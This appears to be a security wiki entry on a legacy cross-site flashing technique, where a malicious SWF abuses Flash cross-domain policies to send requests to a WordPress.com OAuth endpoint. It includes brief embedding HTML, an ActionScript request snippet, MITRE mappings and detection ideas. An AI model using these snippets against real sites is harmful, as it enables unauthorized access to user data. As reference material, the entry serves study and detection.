---
url: ''
tags:
  - flash
  - exploit
  - cross-domain
type: tool
verified: false
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:10.866Z'
id: 937821ba-2045-4f26-9d8d-44ae7d36bea6
validated: true
submitted: true
---
# Flash-SWF-Malicious

**Status**: Unverified

## Overview

Malicious SWF (Shockwave Flash) files are used in this context to exploit cross-domain policies, enabling arbitrary requests to target APIs like WordPress.com's from untrusted domains such as yimg.com. Primary use case: Bypassing authorization in Flash-enabled browsers for client-side attacks.

## Description

This tool refers to a custom malicious SWF file injected via an HTML page. It leverages Adobe Flash's crossdomain.xml policy to make unauthorized HTTP requests to restricted endpoints, reading responses to exfiltrate data or authorize apps. In offensive security, it's used for Cross-Site Flashing attacks, similar to XSS but targeting legacy Flash vulnerabilities. Note: Flash is deprecated; modern browsers block it by default.

## Features

- Feature 1: Cross-domain request forging to APIs
- Feature 2: Response reading and data exfiltration
- Feature 3: OAuth flow bypass via simulated authorized requests

## Installation

### Requirements

- Adobe Flash Player (deprecated; use legacy browser like older Firefox)
- HTML host for embedding SWF

### Install Commands

No installation; compile SWF using Adobe Flash Professional or open-source tools like Ming library:

```bash
# Example using Ming (install via package manager)
sudo apt install ming
# Compile AS3 code to SWF (custom script required)
```

## Basic Usage

Embed in HTML:

```html
<object data="malicious.swf" type="application/x-shockwave-flash"></object>
```

### Common Options

| Option | Description |
|--------|-------------|
| N/A | SWF is binary; parameters set in ActionScript code |

## Examples

### Example 1: Basic Usage

Host HTML page loading SWF:

```html
<!DOCTYPE html>
<html>
<body>
<script>
  var flashvars = {};
  var params = {allowScriptAccess: "always"};
  var attributes = {};
  swfobject.embedSWF("http://yimg.com/malicious.swf", "flash", "1", "1", "9.0.0");
</script>
</body>
</html>
```

### Example 2: Advanced Usage

Configure SWF ActionScript to target specific endpoint:

```actionscript
// In SWF code
var loader:URLLoader = new URLLoader();
loader.load(new URLRequest("https://public-api.wordpress.com/oauth2/token"));
```

> Loads SWF to send requests; wait 10-20s for execution.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation for Client Execution]]

### Tactics

- [[Initial Access]]

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor for Flash loads from untrusted domains (e.g., yimg.com) in browser logs
- Detection method 2: Anomalous cross-origin requests to OAuth endpoints without user interaction

## Related Procedures


## Related Tools

- [[Burp Suite]] (for inspecting Flash traffic)

## References

- Adobe Flash documentation (archived)
- HackerOne Report #176308
